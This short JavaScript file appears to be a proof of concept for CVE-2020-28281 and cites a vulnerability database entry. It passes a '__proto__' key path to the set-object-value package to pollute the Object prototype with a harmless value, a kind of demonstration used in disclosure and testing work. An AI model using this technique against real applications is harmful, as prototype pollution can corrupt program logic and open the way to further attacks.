//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
    var setObjectValue = require("set-object-value")
    obj = {}
    
    setObjectValue(obj, ['__proto__','polluted'], "yes");
  